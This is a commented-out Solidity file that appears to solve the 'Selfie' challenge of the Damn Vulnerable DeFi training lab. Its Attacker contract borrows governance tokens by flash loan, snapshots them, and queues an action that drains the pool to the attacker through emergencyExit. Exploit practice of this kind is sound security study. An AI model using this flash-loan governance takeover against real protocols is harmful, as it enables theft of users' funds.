/*
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {SelfiePool, SimpleGovernance, DamnValuableTokenSnapshot} from "../../src/selfie/SelfiePool.sol";
import "openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker is IERC3156FlashBorrower{
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    address owner;
    uint256 actionId;

    constructor(address _pool, address _governance, address _token){
        owner = msg.sender;
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack(uint256 amount) public {
        pool.flashLoan(IERC3156FlashBorrower(this), address(token), amount, "0x");
    }

    function onFlashLoan(
            address initiator,
            address _token,
            uint256 amount,
            uint256 fee,
            bytes calldata data
        ) external returns (bytes32){
            token.snapshot();
            // queueAction needs: Target, value, data
            actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", owner));
            token.approve(address(pool), amount);
            return keccak256("ERC3156FlashBorrower.onFlashLoan");
        }

    function executeAction() public{
        governance.executeAction(actionId);
    }

}
*/